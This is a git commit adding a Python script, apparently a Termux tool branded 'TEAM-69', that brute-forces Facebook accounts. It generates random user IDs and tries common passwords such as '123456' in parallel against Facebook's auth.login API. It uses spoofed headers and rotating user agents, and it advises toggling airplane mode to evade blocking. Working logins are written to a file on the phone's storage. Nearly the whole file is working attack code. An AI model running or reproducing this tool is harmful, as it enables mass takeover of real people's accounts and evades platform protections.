c63785238b73957550dd3de08516343e2b96e6b2
NAFIS-124 <168470132+NAFIS-124@users.noreply.github.com>
2024-07-30 15:03:18 +0600

    Add files via upload

---
+++ OLD.py
@@ -0,0 +1,144 @@
+#───────────────[ IMPORT SYSTEM ]─────────────────────────#
+#https://github.com/NAFIS-124
+#ͲᎬᎪᎷ 69 ᴴᵉⁿᵗᵃⁱ✖‿✖•
+#https://www.facebook.com/TEAM69.HENTAI
+import requests,bs4,json,os,sys,random,datetime,time,re
+import os,random
+import sys,time,uuid
+import rich,json,subprocess,random,string
+import urllib3,rich,base64
+from os import system as c
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+try:
+        os.system('clear')
+        import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
+        import os,sys,tempfile,string,random,subprocess,uuid
+        from time import localtime as lt
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,httpx
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as NAFIS
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system('pip install requests futures==2 > /dev/null')
+except:pass
+pretty.install()
+CON=sol()
+#__________________| LOOP |__________________#
+loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
+
+def clear():
+        os.system('clear')
+#────────[ COLORS ]────────#
+yellow = "\033[10;93m"
+rad="\x1b[38;5;160m"
+green="\x1b[38;5;118m"
+yelloww="\033[1;33m"
+white="\033[1;37m"
+
+#__________________| UA |__________________#
+def M():
+    aV=str(random.choice(range(10,20)))
+    A=f"Mozilla/5.0 (M; U; M NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
+    bV=str(random.choice(range(1,36)))
+    bx=str(random.choice(range(34,38)))
+    bz=f"5{bx}.{bV}"
+    B=f"Mozilla/5.0 (M NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
+    cV=str(random.choice(range(1,36)))
+    cx=str(random.choice(range(34,38)))
+    cz=f"5{cx}.{cV}"
+    C=f"Mozilla/5.0 (M NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
+    D=f"Mozilla/5.0 (M NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
+    return random.choice([A,B,C,D])
+
+#>━━━━━━━━SIM━━━━━━━━<#
+sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'{rad} ~ \x1b[38;5;118m')
+
+
+logo =""" 
+\033[1;37m
+       ┬┌┬┐┌─┐  ┬ ┬┌─┐┌┐┌┌┬┐┌─┐┬
+       │ │ ┌─┘  ├─┤├┤ │││ │ ├─┤│
+       ┴ ┴ └─┘  ┴ ┴└─┘┘└┘ ┴ ┴ ┴┴  \x1b[38;5;196mTEAM-69
+\x1b[38;5;160m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[38;5;160m• \033[1;37mFACEBOOK \x1b[38;5;160m» \033[1;37mITZ HENTAI
+\x1b[38;5;160m• \033[1;37mGITHUB   \x1b[38;5;160m» \033[1;37mNAFIS-124
+\x1b[38;5;160m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""" 
+
+#───────────────[ OLD - MENU ]───────────────# 
+def Old_m():
+       user=[]
+       print(logo)
+       limit=input(f"\x1b[38;5;160m» \033[1;37m INPUT \033[1;37m: ")
+       os.system('clear')
+       print(logo)
+       print(f'\033[1;37m A \x1b[38;5;160m» \033[1;37mMETHOD 1 ')
+       print(f'\r\x1b[38;5;160m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+       ask=input(f"\x1b[38;5;160m» \033[1;37m INPUT : ")
+       if ask in["A','a','01','1"]:
+          star="10000"
+          for i in range(int(limit)):
+              data=str(random.choice(range(1000000000,9999999999)))
+              user.append(data)
+       else:
+        star="100000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(100000000,999999999)))
+            user.append(data)    
+       with NAFIS(max_workers=60) as reyad:
+           os.system('clear')
+           print(logo)
+           print(f'{rad}• {white}TOTAL IDS {rad}» \033[10;93m{limit}{rad}•{white}M{ask} ')
+           print(f'{rad}• {white}SIM NAME {rad}» {white}{sim}')
+           print(f'{rad}• {white}USE YOUR AIRPLANE MODE ON OFF AFTER 3 MIN')
+           print(f'\r\x1b[38;5;160m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+           for mal in user:
+              uid=star+mal
+              reyad.submit(login,uid)
+    
+loop=0
+oks=[]
+cps=[]
+#───────────────[ OLD - CLONE - METHOD ]───────────────#
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f'\r{rad}• {white}OLD{rad}•{white}A {rad}» {white}{loop}{rad} » {green}OK {rad}» {green}{len(oks)}')
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": M(), 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(f'\r{rad}• {white}NAFIS{rad}•{white}OK {rad}»{green} {uid} {rad}» {green}{pw}')
+                open("/sdcard/NAFIS-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:          	
+            	print(f'\r{rad}• {white}NAFIS{rad}•{white}OK {rad}»{green} {uid} {rad}» {green}{pw}')
+            	open("/sdcard/NAFIS-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+            	oks.append(uid)
+            	break
+            else:continue
+        loop+=1
+    except:pass
+#__________________| END |__________________#
+
+Old_m()
